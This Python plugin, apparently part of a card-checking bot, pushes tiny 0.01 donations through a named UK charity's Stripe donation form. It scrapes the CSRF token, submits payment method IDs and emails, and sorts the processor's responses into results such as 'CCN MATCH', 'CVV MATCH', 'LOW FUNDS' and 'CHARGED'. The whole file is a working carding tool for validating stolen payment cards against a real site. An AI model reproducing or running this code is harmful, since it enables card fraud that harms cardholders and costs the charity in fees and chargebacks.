from mills.plugins._helpers.tools import find_between
# from joc.classes.RandUser import RandUser


def cc_one(r, id, email):
    a = r.get(f'https://www.thrive.org.uk/donate-form-single?amount=0.01&other_amount=')
    crsf = find_between(a.text,'CRAFT_CSRF_TOKEN" value="','"')
    if not crsf: return
    c_data = {
'payment_method_id': id,
'email': email,
'frequency': 'Single',
'amount': '0.01',
'CRAFT_CSRF_TOKEN': crsf,
}

    head = {
'accept': 'application/json',
'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
'cache-control': 'max-age=0',
'content-length': '237',
'content-type': 'application/x-www-form-urlencoded',
}
    
    c = r.post('https://www.thrive.org.uk/actions/thrive-module/stripe/confirm-payment',  c_data, headers = head)
    if 'error' in c.json():
        message = c.json()['error']
        r_text, r_logo, r_respo = get_response_cc(message)
        return r_text,r_logo,r_respo
    else:
        return "CHARGED $0.1", "✅", 'CVV MATCH'




def get_response_cc(text: str):
    if "card was declined" in text or 'card_declined' in text or 'The transaction has been declined' in text or 'Processor Declined' in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'DECLINED'
    elif 'Your card number is incorrect' in text or 'Call to a member function attach() on null' in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'DECLINED'
    elif 'incorrect_zip' in text or 'Your card zip code is incorrect.' in text or 'The zip code you supplied failed validation' in text or 'card zip code is incorrect' in text:
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'CVV MATCH'
    elif "card has insufficient funds" in text or 'insufficient_funds' in text or 'Insufficient Funds' in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'CVV MATCH'
    elif 'incorrect_cvc' in text or "card's security code is incorrect" in text or "card&#039;s security code is incorrect" in text or "security code is invalid" in text or 'CVC was incorrect' in text or "incorrect CVC" in text or 'cvc was incorrect' in text or 'Card Issuer Declined CVV' in text or 'security code is incorrect' in text:
        r_text, r_logo, r_respo = "CCN MATCH", "✅", 'CCN Match'
    elif "card does not support this type of purchase" in text or 'transaction_not_allowed' in text or 'Transaction Not Allowed' in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'DECLINED'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'DECLINED'
    elif "card has expired" in text or 'Expired Card' in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'DECLINED'
    elif 'Donation Confirmation' in text or "This page doesn't seem to exist" in text or 'seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "CHARGED $0.1", "✅", 'CVV MATCH'
    else:
        r_text, r_logo, r_respo = 'UNKOWN RESPONSE', "❌", 'DECLINED'
    r_text1 = text.strip() if text else r_text
    return r_text1, r_logo, r_respo